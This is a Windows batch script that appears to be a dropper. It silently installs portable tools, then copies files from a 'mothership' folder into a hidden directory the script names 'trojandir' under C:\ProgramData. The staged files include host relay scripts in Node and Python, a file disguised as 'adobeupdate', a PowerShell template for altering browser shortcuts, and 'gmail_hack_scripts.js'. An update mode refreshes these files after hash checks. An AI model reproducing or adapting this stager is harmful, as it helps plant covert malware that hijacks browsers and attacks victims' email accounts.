setlocal enabledelayedexpansion
@echo off

set update=FALSE

echo cmd line args %*

IF "%1"=="update" (
    echo WARNING -- update flag is true --- press enter to proceed
    set /p MyVariable=" "
    timeout /t 3
    SET update=TRUE
)

FOR /F "tokens=1,2" %%A IN ('wmic logicaldisk get name^,volumename 2^>nul ^| findstr /I /C:"MAIN"') DO SET "DRIVE_LETTER=%%A"

subst Z: C:\

set progdir=%userprofile%\AppData\Local

set installname=chrome-win64
IF NOT EXIST "%progdir%\%installname%" (
    start "" /min robocopy "%DRIVE_LETTER%\__Binaries\%installname%" "%progdir%\%installname%" /E
)

set installname=Microsoft VS Code
IF NOT EXIST "%progdir%\%installname%" (
    start "" /min robocopy "%DRIVE_LETTER%\__Binaries\%installname%" "%progdir%\%installname%" /E
)

set installname=Explorer++Portable
IF NOT EXIST "%progdir%\%installname%" (
    start "" /min robocopy "%DRIVE_LETTER%\__Binaries\%installname%" "%progdir%\%installname%" /E
)

set installname=Notepad++Portable
IF NOT EXIST "%progdir%\%installname%" (
    start "" /min robocopy "%DRIVE_LETTER%\__Binaries\%installname%" "%progdir%\%installname%" /E
)

set installname=SystemInternals
IF NOT EXIST "%progdir%\%installname%" (
    start "" /min robocopy "%DRIVE_LETTER%\__Binaries\%installname%" "%progdir%\%installname%" /E
)

set installname=Git-2.51.0-64-bit.exe
IF NOT EXIST "%progdir%\%installname%" (
    start "" /min robocopy "%DRIVE_LETTER%\__Binaries" %progdir% %installname% & conhost.exe %progdir%Git-2.51.0-64-bit.exe
)

set mothershipdir=%DRIVE_LETTER%\WORKING\hacking_WORK\DevOps\git_repo\mothershipassets
set trojandir=C:\ProgramData\owd
cd /d %trojandir%

mkdir %trojandir%\.vscode

set nodedir=%trojandir%\node\node-v26.4.0-win-x64

IF NOT EXIST %nodedir% (
    start "" /min robocopy %DRIVE_LETTER%\__Binaries\node-v26.4.0-win-x64 %nodedir% /E
)

set output=
IF EXIST %nodedir%\node.exe (
    for /f "tokens=*" %%i in ('%nodedir%\node.exe --version') do set "output=%%i"
    set "output=%output: =%"
)

IF NOT "%output%"=="v26.4.0" (
    echo node version not correct
)

copy /y %mothershipdir%\.vscode\*.* %trojandir%\.vscode 

set files=nodehostrelay.cmdslist.js
set files=%files% nodehostrelayhelper.js
set files=%files% nodehostrelay.js
set files=%files% pythonrelay.py
set files=%files% pythonhostrelay.py
set files=%files% tpl_launch.cmd
set files=%files% adobeupdate
set files=%files% modify_browser_lnk_tpl.ps1
set files=%files% gmail_hack_scripts.js


FOR %%A IN (%files%) DO (
    IF NOT EXIST %trojandir%\%%A (
        echo INFO copying %%A to %trojandir%
        copy /y %mothershipdir%\%%A %trojandir%\%%A
    ) ELSE (

        FOR %%A IN ("%mothershipdir%\%%A") DO set "mdt=%%~tA"
        FOR %%A IN ("%trojandir%\%%A") DO set "dt=%%~tA"

        certutil -hashfile %trojandir%\%%A MD5 | find /v ":" > %temp%\%%A.MD5
        certutil -hashfile %mothershipdir%\%%A MD5 | find /v ":" > %temp%\m%%A.MD5

        set /p %%AMD5=<%temp%\%%A.MD5
        set /p m%%AMD5=<%temp%\m%%A.MD5

        SET md5_check=ERROR
        IF "!m%%AMD5!"=="!%%AMD5!" (
            SET md5_check=OK
        )

        SET dt_check=ERROR
        IF "!mdt!"=="!dt!" (
            SET dt_check=OK
        )

        echo WARN -- dest file exists [ %%A ]
        echo src !mdt! !m%%AMD5!
        echo des !dt! !%%AMD5! 
        echo MD5 !md5_check! dt !dt_check!

        xcopy %mothershipdir%\%%A %trojandir%\%%A /d /y /L

        IF "%update%"=="TRUE" (
            xcopy %mothershipdir%\%%A %trojandir%\%%A /d /y
        )

    )
)
